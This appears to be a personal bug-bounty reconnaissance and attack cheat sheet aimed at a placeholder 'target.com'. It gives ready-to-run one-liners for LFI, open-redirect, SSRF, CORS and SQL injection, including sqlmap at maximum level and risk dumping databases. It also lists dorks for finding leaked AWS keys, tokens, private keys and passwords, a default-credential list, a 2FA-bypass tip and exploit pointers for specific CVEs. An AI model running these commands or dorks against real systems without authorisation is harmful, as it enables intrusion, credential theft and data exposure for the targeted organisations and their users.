# R-Meth
-whois target.com | grep "NetName\|OrgName\|AS"   find org name 
-curl -s https://api.hackertarget.com/aslookup/?q=target.com
-whois ASXXXXX | grep -E "CIDR|inetnum"
-curl -s https://crt.sh/\?q\=%.target.com\&output\=json | jq -r '.[].name_value' | sort -u
-curl -s "http://web.archive.org/cdx/search/cdx?url=target.com/robots.txt&output=json" | jq '.[1:] | .[] | .[2]' | sort -u > historical_robots.txt
-curl -s "https://scrape.pastebin.com/api_scraping.php?limit=100" | grep -Eo "target\.com" | sort -u



-start the recon process with some vulnerability assesments & automation easy recon (magicrecon, rapidscan, sniper, frogy2.0, raccon, openvas, omsedaus) for get some easy info

1-collect subdomains from here https://shrewdeye.app/ and https://pentest-tools.com/ and shodanx and crt.sh and amass    crtsh:-"curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew crtsh_subs.txt"

2-find others subdomains by assetfinder, subfinder - scan the dns using dnsrecon, dnsenum

2- use cloudenum after make sure you got all subs, and dnschef - dnstake - dnsdumpster, by the meaning try to exploit any dns shit

- use theharvester
- eyewitness for getting some screenshots on strange ports

3- use httpx "sudo httpx -l allsubs.txt -sc -td -title -wc -bp -cdn --websocket --follow-redirects" and "sudo httpx -l allsubs.txt"

4- HXCC-scanner, HexHTTP by a list of httpx to detect http possible vulns

5- use subzy sudo subzy run --targets live_subs.txt then use DIG if you found retailed CNAME try to claim it 

6- use some automations like rapidscan, sniper, trufflehog if found a github

7-find more manual subdomains by google dorking https://github.com/Zierax/GoogleDorker, googler, or even do ia manually

8-use nmap, shodan dorks for open ports if you found ssh,ftp,smtp,sftp, etc... try to find versions then find exploits to them " Ssl.cert.subject.CN:"Roblox Corporation" "

9-use smuggler to check request smuggling vulnerablitiy "cat httpx.txt | smuggler.py | tee -a smuggler.txt" 

9-use porch pirate to get api repos from postman or use web.postman.com manually

10-using ffuf or gobuster and nikto to find hidden directories

11-using waybackurls, gobuster, gau, katana, hakrawler then seperate the results for js, php, xml, txt, aspx, html, sql, json

-execute this in https://docs.github.com/en/graphql "{"query": "query { search(query: \"<<target>>.com\", type: REPOSITORY, first: 10) { edges { node { ... on Repository { name url } } } } }"}
"

-use gf for seperate the types of findings to sqli, xss, ssrf, etc... for using them in Xray "https://github.com/chaitin/xray" by the plugins for each one, example "xargs -a xss_from_gf.txt-I@ sh -c './xray webscan --plugins xss --url "@" --html-output xss.html"

12-use jshunter, mantra, arjun, jsleak for define parameters and interesting api,endpoints in js, php, aspx files, cat urls.txt | grep ".js" | while read url; do curl -s "$url" | grep -Eo "https?://[^\"']+"; done | tee js_endpoints.txt


13-use social hunter https://github.com/utkusen/socialhunter for broken links hijacking

13-use kiterunner for scanning api targets

14-use eyewitness --web -f live_subs.txt -d screenshots

15-nuclei -l httpx.txt -rl 10 -bs -c 2 -as -s critical,high,medium

16-using some oneliners to get some easy fruits 
LFI   cat targets.txt | (gau || hakrawler || waybackurls || katana) |  grep "=" |  dedupe | httpx -silent -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
OPRD  echo target.com | (gau || hakrawler || waybackurls || katana) | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
SSRF  cat urls.txt | grep "=" | qsreplace "burpcollaborator_link" >> tmp-ssrf.txt; httpx -silent -l tmp-ssrf.txt -fr 
SSRF2 cat potential_ssrf.txt | qsreplace 'http://YOUR_COLLABORATOR_ID.burpcollaborator.net' | httpx -silent -status-code 302,200
XSS   cat targets.txt | (gau || hakrawler || waybackurls || katana) | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
SQLI  cat subs.txt | (gau || hakrawler || katana || waybckurls) | grep "=" | dedupe | anew tmp-sqli.txt && sqlmap -m tmp-sqli.txt --batch --random-agent --level 5 --risk 3 --dbs && for i in $(cat tmp-sqli.txt); do ghauri -u "$i" --level 3 --dbs --current-db --batch --confirm; done
CORS  echo target.com | (gau || hakrawler || waybackurls || katana) | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
TAKEOVER subfinder -d target.com -o subs_for_takeover.txt && nuclei -t wp-xyz-takeover.yaml -l subs_for_takeover.txt 



17-github manual dorking "https://gist.github.com/search?l=JSON&q=*%2Atarget.com", "https://github.com/search?q="target.com"&type=code", etc...

18-use fuzzuli for find backup files



NOTES:

-check clickjacking by clickjacker.io
-beautiy js by beautifier.io
-check js, php, txt files manually
-text interestings manually
-use sniper as less as possible (time consuming, resources consuming)
-try manually, auto-fuzzing on interesting endpoints
-wordpress is juicy shit!!
-seperate your results well
-get favicon hash "curl https://favicon-hash.kmsec.uk/api/?url=https://test.com/favicon.ico | jq"
-this https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt have all bugbounty targets you can use it as mass automation for low hanging fruits
-some golden Shodan Dorks:
	• ssl:"target.com" http.status:200 http.title:"dashboard" 
	• org:"target.com" http.component:"jenkins" http.status:200 
	• ssl:"target.com" http.status:200 product:"ProFTPD" port:21 
	• http.html:"zabbix" vuln:CVE-2022-24255
	• org:"target.com" http.title:"phpMyAdmin"
	• ssl:"target.com" http.title:"BIG-IP" vuln:CVE-2020-5902
	• ssl.cert.subject.cn:*.taarget.com http.title:"Dashboard [Jenkins]"
	• http.html:"xoxb-"
	• http.html:"AKIA" 
	• http.html:"AIza" 
	• ssl.cert.subject.CN:"*.target.com"+200 http.title:"Admin"
	• http.html:"The wp-config.php creation script uses this file"
	• http.title:"Index Of /"
	• http.title:"Directory Listing" org:organization-name
	• product:"Splunk",,,, Exploit like this=> 127.0.0.1:8000/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json
	• Ssl:”domain” 200 http.title:”citrix gateway”
	• http.title:"swagger UI" org:"Target"
	• net:"I.P.v.4/CIDR" http.title:dashboard
	• org:"Company Inc" http.title:dashboard
	• asn:ASN Number e.g. AS19551+http.title:"dashboard”
	• org:Company http.status:"403"
	• Set-Cookie:"mongo-express=" "200 OK"	
	• ssl.cert.subject.CN:"*.target.com" "230 login successful" port:"21"
	• http.title:"Django REST framework"
	



-check for some vulnerabilities in shodan by:
	• CVE-2023-35078 - http.title:"MobileIron"  
	• CVE-2023-35078 - http.favicon.hash:362091310	https://github.com/vchan-in/CVE-2023-35078-Exploit-POC

-some golden Google Dorks use them on Bing searchengine:
	• site:docs.google.com/spreadsheets "Target"
	• site:groups.google.com "Target"
	• intitle:"Swagger UI" site:roblox.com	
	• site:target.com inurl:login | inurl:signin | intitle:Login | intitle:"sign in" | inurl:auth
	• site:domain.com inurl:view inurl:private ext:pdf
	• site:domain.com inurl:upload ext:pdf
	• site:domain.com inurl:uploads ext:pdf
	• site:domain.com inurl:internal ext:pdf
	• site:domain.com inurl:storage ext:pdf
	• site:domain.com inurl:download ext:pdf
	• site:domain.com inurl:webview ext:pdf
	• site:domain.com inurl:content ext:pdf
	• site:domain.com inurl:_data ext:pdf
	• site:domain.com inurl:<keyword> ext:pdf -docs -doc -documentation -form -draft -application -sample -template -public
	• site:domain.com ext:py
	• intitle:"Dashboard [Jenkins]" Credentials
	• inurl:/api/v1/splashmodal site:domain.com
	• site:domain.com "Choose File"
	• site:domain.com "No file chosen"
	• site:domain.com "Upload"
	• site:domain.com "Upload here"
	• site:domain.com "Upload a file"
	• site:domain.com "Please upload your"
	• site:*<*.target.com intext:"login" | intitle:"login" | inurl:"login" | intext:"username" | intitle:"username" | inurl:"username" | intext:"password" | intitle:"password" | inurl:"password"
	• site:*.redacted.com -www -www1 -blog
-some golden Github Dorks:
	• target.com SECRET_KEY | DB_PASSWORD 
	• target.com "INSERT INTO users" 
	• target.com "aws_access_key_id" "aws_secret_access_key" 
	• target.com "Authorization: Bearer" 
	• target.com "client_id" "client_secret" 
	• target.com "password=" 
	• target.com "BEGIN RSA PRIVATE KEY" 
	• target.com "mongodb://username:password@"
	• target.com "MYSQL_ROOT_PASSWORD" 
	• target.com "smtp_pass"
	• target.com filename:vim_settings.xml
	• service-now password | okta.com | looker.com secret  "target"
	• org:companyname "AWS_ACCESS_KEY_ID:"
	• org:"company" ftp_user AND ftp_password AND ftp_host
	• https://github.com/search?q=COMPANY_NAME&type=users ##use this as link not a dork for find users retailed with company name##
	• http.html:"apollo-adminservice"
	•
	•
	•


-default creds to try on target
	• admin:admin
	• test:test
	• admin:password
	• admin:pass
	• test@test.com:test
	• test@company.com:test (try with all domains that belong to company)
	• test@company.com:test@company,com

-a good github dork list
https://gist.github.com/jhaddix/1fb7ab2409ab579178d2a79959909b33

-use fully automated vuln scanner like https://github.com/v3n0m-Scanner/V3n0M-Scanner when you find a suspectios domain 

-copy the copyright  in your target site and  search google for previous years to discover abandoned asset . E.g " © 2024 Uber Technologies Inc."

-use wpscan if you found any wordpress sites

-if you found embed.<target>.com, try to Logged in to subdomain with same creds then you will Full access to main domain without entering 2FA

-if you find any PDFs or files use exiftool

-Look for Google Analytics Tracking IDs (UA-XXXXXX-X) and use https://dnslytics.com/reverse-analytics to discover more assets sharing the same ID.

-look for port 2181-zookeeper for easy RCEs

-Leak PII sensitive API Users DATA with URL Path Permutations: /api/users/user@email.com OR /api/users/1234

-port 9090 could be zues-admin panel 

-find some informations about domain by https://viewdns.info/reversewhois/

-use https://dorkmine.vercel.app/ for easy dorks

-boost you recon by https://inteltechniques.com  AND  https://intelx.io  

-some mindmaps cheatsheet   https://github.com/Ignitetechnologies/Mindmap

-use this site make google dorking lot easier  https://taksec.github.io/google-dorks-bug-bounty/

-if you found any nginx, apache, jfrog, etc... versions try to find cves for it in google, github, exploitdb, etc...

-use this to find all endpoints in the site by browser console " (()=>{const p=[...new Set([...document.querySelectorAll("a[href]")].map(a=>new URL(a.href,location.href).pathname))],b=new Blob([p.join("\n")],{type:"text/plain"}),a=Object.assign(document.createElement("a"),{href:URL.createObjectURL(b),download:`${location.hostname.replace(/^www\./,"")}.txt`});document.body.appendChild(a),a.click(),document.body.removeChild(a);})(); "

